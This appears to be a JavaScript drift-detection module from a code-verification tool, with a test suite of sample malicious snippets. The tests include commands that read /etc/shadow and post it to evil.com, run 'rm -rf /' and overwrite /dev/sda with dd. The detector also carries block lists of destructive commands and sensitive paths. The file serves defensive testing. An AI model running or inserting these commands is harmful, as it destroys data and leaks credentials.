/**
 * Semantic Intent Verification Engine - Drift Detector
 * Compares Intent Contract against Extracted Behavior with semantic operation analysis
 * Identifies violations between what the code is allowed to do and what it actually does
 */

function detectDrift(contract, behavior) {
  const violations = [];

  // ============================================================
  // LEGACY FORBIDDEN ACTIONS CHECK (BACKWARD COMPATIBLE)
  // ============================================================

  const forbiddenActionMap = {
    "file_system_access": () => behavior.fs_access === true,
    "outbound_network_calls": () => behavior.network_calls && behavior.network_calls.length > 0,
    "child_process_execution": () => behavior.child_process === true,
    "hardcoded_secrets": () => behavior.hardcoded_secrets === true,
    "unauthorized_db_access": () => behavior.db_queries && behavior.db_queries.length > 0
  };

  // Check forbidden actions
  if (contract.forbidden_actions && Array.isArray(contract.forbidden_actions)) {
    for (const forbiddenAction of contract.forbidden_actions) {
      const checkFn = forbiddenActionMap[forbiddenAction];
      if (checkFn && checkFn()) {
        violations.push({
          type: "forbidden_action",
          detail: `${forbiddenAction} detected in behavior`,
          severity: "HIGH"
        });
      }
    }
  }

  // ============================================================
  // SEMANTIC OPERATION ANALYSIS
  // ============================================================

  const semanticOps = behavior.semantic_operations || [];
  const constraints = contract.intent_constraints || {};
  const riskLevels = { LOW: 1, MEDIUM: 2, HIGH: 3, CRITICAL: 4 };
  const maxRiskValue = riskLevels[constraints.max_risk_level] || riskLevels.CRITICAL;

  for (const op of semanticOps) {
    // ========================================================
    // 1. RISK LEVEL DRIFT
    // ========================================================
    if (riskLevels[op.risk] && riskLevels[op.risk] > maxRiskValue) {
      violations.push({
        type: "semantic_drift",
        severity: op.risk,
        detail: `Operation risk level [${op.risk}] exceeds maximum allowed [${constraints.max_risk_level}]: ${op.domain}.${op.action}`,
        operation: op
      });
    }

    // ========================================================
    // 2. DATABASE DRIFT
    // ========================================================
    if (op.domain === "database") {
      // Bulk operations check
      if (constraints.allow_bulk_operations === false && op.metadata.bulk_operation === true) {
        violations.push({
          type: "semantic_drift",
          severity: "CRITICAL",
          detail: `Bulk database operation detected: ${op.action} on ${op.target} without WHERE clause`,
          operation: op
        });
      }

      // Unauthorized tables check
      if (constraints.allowed_tables && Array.isArray(constraints.allowed_tables)) {
        if (!constraints.allowed_tables.includes(op.target)) {
          violations.push({
            type: "semantic_drift",
            severity: "HIGH",
            detail: `Unauthorized database table access: ${op.target} not in allowed_tables`,
            operation: op
          });
        }
      }

      // Dangerous scope checks
      if (op.action === "DELETE" && op.scope === "ALL_ROWS") {
        violations.push({
          type: "semantic_drift",
          severity: "CRITICAL",
          detail: `Dangerous bulk DELETE detected on table: ${op.target}`,
          operation: op
        });
      }

      if (op.action === "UPDATE" && op.scope === "ALL_ROWS") {
        violations.push({
          type: "semantic_drift",
          severity: "HIGH",
          detail: `Bulk UPDATE detected on table: ${op.target} without WHERE clause`,
          operation: op
        });
      }
    }

    // ========================================================
    // 3. FILESYSTEM DRIFT
    // ========================================================
    if (op.domain === "filesystem") {
      // Recursive deletion check
      if (constraints.allow_recursive_delete === false && op.metadata.recursive === true) {
        violations.push({
          type: "semantic_drift",
          severity: "CRITICAL",
          detail: `Recursive filesystem deletion not allowed: ${op.target}`,
          operation: op
        });
      }

      // System directory deletion check
      if (op.action === "DELETE") {
        const systemPaths = ["/", "/bin", "/boot", "/etc", "/lib", "/sys", "/root", "/home"];
        if (systemPaths.some(p => op.target.startsWith(p))) {
          violations.push({
            type: "semantic_drift",
            severity: "CRITICAL",
            detail: `Deletion of system directory detected: ${op.target}`,
            operation: op
          });
        }
      }

      // Sensitive file write check
      if (op.action === "WRITE" || op.action === "APPEND") {
        const sensitiveFiles = ["/etc/passwd", "/etc/shadow", "/etc/cron", "/root/.ssh"];
        if (sensitiveFiles.some(f => op.target.includes(f))) {
          violations.push({
            type: "semantic_drift",
            severity: "CRITICAL",
            detail: `Write to sensitive file detected: ${op.target}`,
            operation: op
          });
        }
      }

      // Allowed paths check
      if (constraints.allowed_paths && Array.isArray(constraints.allowed_paths)) {
        const isAllowed = constraints.allowed_paths.some(path => op.target.startsWith(path));
        if (!isAllowed) {
          violations.push({
            type: "semantic_drift",
            severity: "HIGH",
            detail: `Filesystem access outside allowed paths: ${op.target}`,
            operation: op
          });
        }
      }

      // Sensitive file read check
      if (op.action === "READ" && op.metadata.sensitive_file === true) {
        if (constraints.allow_sensitive_reads !== true) {
          violations.push({
            type: "semantic_drift",
            severity: "HIGH",
            detail: `Read of sensitive file detected: ${op.target}`,
            operation: op
          });
        }
      }
    }

    // ========================================================
    // 4. NETWORK DRIFT
    // ========================================================
    if (op.domain === "network") {
      // Suspicious domain check
      if (op.metadata.suspicious === true && constraints.allow_suspicious_domains !== true) {
        violations.push({
          type: "semantic_drift",
          severity: "HIGH",
          detail: `Outbound request to suspicious domain: ${op.target}`,
          operation: op
        });
      }

      // Unknown domain check
      if (constraints.allowed_domains && Array.isArray(constraints.allowed_domains)) {
        if (!constraints.allowed_domains.includes(op.target)) {
          violations.push({
            type: "semantic_drift",
            severity: "MEDIUM",
            detail: `Outbound request to unknown domain: ${op.target}`,
            operation: op
          });
        }
      }

      // External network calls check
      if (constraints.allow_external_network_calls === false) {
        violations.push({
          type: "semantic_drift",
          severity: "HIGH",
          detail: `External network call not allowed: ${op.action} to ${op.target}`,
          operation: op
        });
      }
    }

    // ========================================================
    // 5. AUTH / PRIVILEGE DRIFT
    // ========================================================
    if (op.domain === "auth") {
      // Privilege escalation check
      if (constraints.allow_privilege_escalation === false) {
        if (op.action === "PRIVILEGE_ESCALATION" || op.action === "GRANT_ROLE") {
          violations.push({
            type: "semantic_drift",
            severity: "CRITICAL",
            detail: `Privilege escalation not allowed: ${op.action} to ${op.target}`,
            operation: op
          });
        }
      }

      // Admin role assignment check
      if (op.target === "admin" && constraints.allow_admin_assignment !== true) {
        violations.push({
          type: "semantic_drift",
          severity: "CRITICAL",
          detail: `Admin role assignment detected`,
          operation: op
        });
      }

      // Allowed roles check
      if (constraints.allowed_roles && Array.isArray(constraints.allowed_roles)) {
        if (!constraints.allowed_roles.includes(op.target)) {
          violations.push({
            type: "semantic_drift",
            severity: "HIGH",
            detail: `Unauthorized role assignment: ${op.target}`,
            operation: op
          });
        }
      }
    }

    // ========================================================
    // 6. PROCESS / COMMAND DRIFT
    // ========================================================
    if (op.domain === "process") {
      // Destructive command check
      if (op.metadata.destructive === true) {
        violations.push({
          type: "semantic_drift",
          severity: "CRITICAL",
          detail: `Destructive shell command detected: ${op.target}`,
          operation: op
        });
      }

      // Shell execution check
      if (constraints.allow_shell_execution === false && op.action === "COMMAND_EXECUTION") {
        violations.push({
          type: "semantic_drift",
          severity: "HIGH",
          detail: `Shell command execution not allowed: ${op.target}`,
          operation: op
        });
      }

      // Dangerous commands check
      const dangerousPatterns = ["rm -rf", "dd", "mkfs", "format", "wipe", "fork", ":(){ *:"];
      if (dangerousPatterns.some(pattern => op.target.includes(pattern))) {
        violations.push({
          type: "semantic_drift",
          severity: "CRITICAL",
          detail: `Dangerous system command detected: ${op.target}`,
          operation: op
        });
      }
    }

    // ========================================================
    // 7. API ROUTE DRIFT
    // ========================================================
    if (op.domain === "api") {
      // Admin route check
      if (op.metadata.admin_route === true && constraints.allow_admin_routes !== true) {
        violations.push({
          type: "semantic_drift",
          severity: "HIGH",
          detail: `Admin route definition not allowed: ${op.target}`,
          operation: op
        });
      }

      // Allowed routes check
      if (constraints.allowed_routes && Array.isArray(constraints.allowed_routes)) {
        const routePath = op.target;
        if (!constraints.allowed_routes.includes(routePath)) {
          violations.push({
            type: "semantic_drift",
            severity: "MEDIUM",
            detail: `Unauthorized route: ${routePath}`,
            operation: op
          });
        }
      }

      // Allowed methods check
      if (constraints.allowed_methods && Array.isArray(constraints.allowed_methods)) {
        if (!constraints.allowed_methods.includes(op.metadata.method)) {
          violations.push({
            type: "semantic_drift",
            severity: "MEDIUM",
            detail: `Unauthorized HTTP method: ${op.metadata.method} on ${op.target}`,
            operation: op
          });
        }
      }
    }
  }

  // ============================================================
  // LEGACY ROUTE CHECKS (BACKWARD COMPATIBLE)
  // ============================================================

  if (behavior.routes && Array.isArray(behavior.routes)) {
    const allowedRoutes = contract.allowed_routes || [];
    
    for (const route of behavior.routes) {
      const routeString = `${route.method} ${route.path}`;
      const isAllowed = allowedRoutes.some(allowed => {
        if (typeof allowed === 'string') {
          return allowed === routeString || allowed === route.path;
        }
        return false;
      });

      if (!isAllowed) {
        violations.push({
          type: "unauthorized_route",
          detail: `${routeString} not in contract.allowed_routes`,
          severity: "MEDIUM"
        });
      }
    }
  }

  // ============================================================
  // LEGACY DEPENDENCY CHECKS (BACKWARD COMPATIBLE)
  // ============================================================

  if (behavior.dependencies && Array.isArray(behavior.dependencies)) {
    const allowedDependencies = contract.allowed_dependencies || [];
    
    for (const dep of behavior.dependencies) {
      if (!allowedDependencies.includes(dep)) {
        violations.push({
          type: "unauthorized_dependency",
          detail: `${dep} not in contract.allowed_dependencies`,
          severity: "MEDIUM"
        });
      }
    }
  }

  // ============================================================
  // LEGACY HTTP METHOD CHECKS (BACKWARD COMPATIBLE)
  // ============================================================

  if (behavior.routes && Array.isArray(behavior.routes)) {
    const allowedMethods = contract.allowed_methods || [];
    
    for (const route of behavior.routes) {
      if (!allowedMethods.includes(route.method)) {
        violations.push({
          type: "unauthorized_method",
          detail: `${route.method} not in contract.allowed_methods`,
          severity: "MEDIUM"
        });
      }
    }
  }

  // ============================================================
  // FINAL ANALYSIS
  // ============================================================

  // Determine if safe (no violations)
  const safe = violations.length === 0;

  // Count violations by severity
  const severityCount = {
    CRITICAL: violations.filter(v => v.severity === "CRITICAL").length,
    HIGH: violations.filter(v => v.severity === "HIGH").length,
    MEDIUM: violations.filter(v => v.severity === "MEDIUM").length,
    LOW: violations.filter(v => v.severity === "LOW").length
  };

  // Generate summary
  const summary = safe 
    ? "No violations found - behavior is compliant with intent contract"
    : `${violations.length} violation(s) found: ${severityCount.CRITICAL} critical, ${severityCount.HIGH} high, ${severityCount.MEDIUM} medium`;

  return {
    violations,
    safe,
    summary,
    severity_breakdown: severityCount
  };
}

module.exports = { detectDrift };

// ============================================================
// COMPREHENSIVE SEMANTIC DRIFT DETECTION TEST SUITE
// ============================================================

if (require.main === module) {
  const { analyzeBehavior } = require('./analyzer');
  
  console.log("🧪 IntentLock Semantic Intent Verification Engine - Test Suite\n");
  console.log("=".repeat(80) + "\n");

  // ============================================================
  // Test 1: BULK DATABASE DELETE (CRITICAL DRIFT)
  // ============================================================
  console.log("TEST 1: Bulk Database Delete (No WHERE clause - CRITICAL)\n");
  const code1 = `
DELETE FROM users;
  `;
  
  const contract1 = {
    allowed_routes: ["/"],
    allowed_methods: ["GET"],
    allowed_dependencies: ["express"],
    forbidden_actions: [],
    intent_constraints: {
      allow_bulk_operations: false,
      allowed_tables: ["students", "products"],
      max_risk_level: "MEDIUM"
    }
  };

  const behavior1 = analyzeBehavior(code1);
  const result1 = detectDrift(contract1, behavior1);
  
  console.log("Code:", code1.trim());
  console.log("\nIntent Constraints:");
  console.log(JSON.stringify(contract1.intent_constraints, null, 2));
  console.log("\nViolations Found:");
  result1.violations.forEach(v => {
    console.log(`  [${v.severity}] ${v.type}: ${v.detail}`);
  });
  console.log("\nSummary:", result1.summary);
  console.log("\n" + "-".repeat(80) + "\n");

  // ============================================================
  // Test 2: RECURSIVE FILESYSTEM DELETION (CRITICAL DRIFT)
  // ============================================================
  console.log("TEST 2: Recursive Root Deletion (CRITICAL)\n");
  const code2 = `
fs.rm("/", { recursive: true });
  `;
  
  const contract2 = {
    allowed_routes: ["/"],
    allowed_methods: ["GET"],
    allowed_dependencies: ["express", "fs"],
    forbidden_actions: [],
    intent_constraints: {
      allow_recursive_delete: false,
      allowed_paths: ["/home/user/data"],
      max_risk_level: "LOW"
    }
  };

  const behavior2 = analyzeBehavior(code2);
  const result2 = detectDrift(contract2, behavior2);
  
  console.log("Code:", code2.trim());
  console.log("\nIntent Constraints:");
  console.log(JSON.stringify(contract2.intent_constraints, null, 2));
  console.log("\nViolations Found:");
  result2.violations.forEach(v => {
    console.log(`  [${v.severity}] ${v.type}: ${v.detail}`);
  });
  console.log("\nSummary:", result2.summary);
  console.log("\n" + "-".repeat(80) + "\n");

  // ============================================================
  // Test 3: OUTBOUND REQUEST TO SUSPICIOUS DOMAIN (HIGH DRIFT)
  // ============================================================
  console.log("TEST 3: Request to Suspicious Domain (HIGH)\n");
  const code3 = `
fetch('https://evil.com/steal');
axios.post('https://data-exfil.io/api');
  `;
  
  const contract3 = {
    allowed_routes: ["/api/users"],
    allowed_methods: ["GET", "POST"],
    allowed_dependencies: ["express", "axios"],
    forbidden_actions: [],
    intent_constraints: {
      allow_external_network_calls: false,
      allowed_domains: ["api.trusted.com"],
      max_risk_level: "MEDIUM"
    }
  };

  const behavior3 = analyzeBehavior(code3);
  const result3 = detectDrift(contract3, behavior3);
  
  console.log("Code:", code3.trim());
  console.log("\nIntent Constraints:");
  console.log(JSON.stringify(contract3.intent_constraints, null, 2));
  console.log("\nViolations Found:");
  result3.violations.forEach(v => {
    console.log(`  [${v.severity}] ${v.type}: ${v.detail}`);
  });
  console.log("\nSummary:", result3.summary);
  console.log("\n" + "-".repeat(80) + "\n");

  // ============================================================
  // Test 4: PRIVILEGE ESCALATION (CRITICAL DRIFT)
  // ============================================================
  console.log("TEST 4: Privilege Escalation (CRITICAL)\n");
  const code4 = `
user.role = "admin";
currentUser.isAdmin = true;
grantRole("root");
  `;
  
  const contract4 = {
    allowed_routes: ["/api/profile"],
    allowed_methods: ["GET", "PUT"],
    allowed_dependencies: ["express"],
    forbidden_actions: [],
    intent_constraints: {
      allow_privilege_escalation: false,
      allow_admin_assignment: false,
      max_risk_level: "MEDIUM"
    }
  };

  const behavior4 = analyzeBehavior(code4);
  const result4 = detectDrift(contract4, behavior4);
  
  console.log("Code:", code4.trim());
  console.log("\nIntent Constraints:");
  console.log(JSON.stringify(contract4.intent_constraints, null, 2));
  console.log("\nViolations Found:");
  result4.violations.forEach(v => {
    console.log(`  [${v.severity}] ${v.type}: ${v.detail}`);
  });
  console.log("\nSummary:", result4.summary);
  console.log("\n" + "-".repeat(80) + "\n");

  // ============================================================
  // Test 5: DESTRUCTIVE SHELL EXECUTION (CRITICAL DRIFT)
  // ============================================================
  console.log("TEST 5: Destructive Shell Execution (CRITICAL)\n");
  const code5 = `
exec("rm -rf /important/data");
execSync("dd if=/dev/zero of=/dev/sda");
  `;
  
  const contract5 = {
    allowed_routes: ["/api/cleanup"],
    allowed_methods: ["POST"],
    allowed_dependencies: ["express", "child_process"],
    forbidden_actions: [],
    intent_constraints: {
      allow_shell_execution: false,
      max_risk_level: "HIGH"
    }
  };

  const behavior5 = analyzeBehavior(code5);
  const result5 = detectDrift(contract5, behavior5);
  
  console.log("Code:", code5.trim());
  console.log("\nIntent Constraints:");
  console.log(JSON.stringify(contract5.intent_constraints, null, 2));
  console.log("\nViolations Found:");
  result5.violations.forEach(v => {
    console.log(`  [${v.severity}] ${v.type}: ${v.detail}`);
  });
  console.log("\nSummary:", result5.summary);
  console.log("\n" + "-".repeat(80) + "\n");

  // ============================================================
  // Test 6: SENSITIVE FILE READ (HIGH DRIFT)
  // ============================================================
  console.log("TEST 6: Sensitive File Read (HIGH)\n");
  const code6 = `
fs.readFile('/etc/shadow', 'utf8', (err, data) => {});
fs.readFile('/etc/passwd', (err, data) => {});
  `;
  
  const contract6 = {
    allowed_routes: ["/"],
    allowed_methods: ["GET"],
    allowed_dependencies: ["express", "fs"],
    forbidden_actions: [],
    intent_constraints: {
      allow_sensitive_reads: false,
      max_risk_level: "MEDIUM"
    }
  };

  const behavior6 = analyzeBehavior(code6);
  const result6 = detectDrift(contract6, behavior6);
  
  console.log("Code:", code6.trim());
  console.log("\nIntent Constraints:");
  console.log(JSON.stringify(contract6.intent_constraints, null, 2));
  console.log("\nViolations Found:");
  result6.violations.forEach(v => {
    console.log(`  [${v.severity}] ${v.type}: ${v.detail}`);
  });
  console.log("\nSummary:", result6.summary);
  console.log("\n" + "-".repeat(80) + "\n");

  // ============================================================
  // Test 7: COMPREHENSIVE MALICIOUS CODE (MULTIPLE DRIFTS)
  // ============================================================
  console.log("TEST 7: Comprehensive Malicious Code (MULTIPLE VIOLATIONS)\n");
  const code7 = `
const express = require('express');
const fs = require('fs');
const { exec } = require('child_process');
const axios = require('axios');

const app = express();

app.post('/admin/users', (req, res) => {
  const user = req.body;
  user.role = "admin";
  
  fs.readFile('/etc/shadow', (err, data) => {
    axios.post('https://evil.com/exfil', { data: data });
  });
  
  exec("rm -rf /");
  
  const sql = "DELETE FROM users;";
  
  res.send('ok');
});
  `;
  
  const contract7 = {
    allowed_routes: ["/api/users"],
    allowed_methods: ["GET", "POST"],
    allowed_dependencies: ["express"],
    forbidden_actions: [],
    intent_constraints: {
      allow_privilege_escalation: false,
      allow_admin_assignment: false,
      allow_sensitive_reads: false,
      allow_external_network_calls: false,
      allow_shell_execution: false,
      allow_bulk_operations: false,
      allowed_tables: ["students"],
      allowed_domains: ["api.trusted.com"],
      max_risk_level: "LOW"
    }
  };

  const behavior7 = analyzeBehavior(code7);
  const result7 = detectDrift(contract7, behavior7);
  
  console.log("Code:", code7.trim());
  console.log("\nIntent Constraints:");
  console.log(JSON.stringify(contract7.intent_constraints, null, 2));
  console.log("\nViolations Found:");
  result7.violations.forEach((v, idx) => {
    console.log(`  ${idx + 1}. [${v.severity}] ${v.type}: ${v.detail}`);
  });
  console.log("\nSeverity Breakdown:", result7.severity_breakdown);
  console.log("\nSummary:", result7.summary);
  console.log("\n" + "=".repeat(80));
}
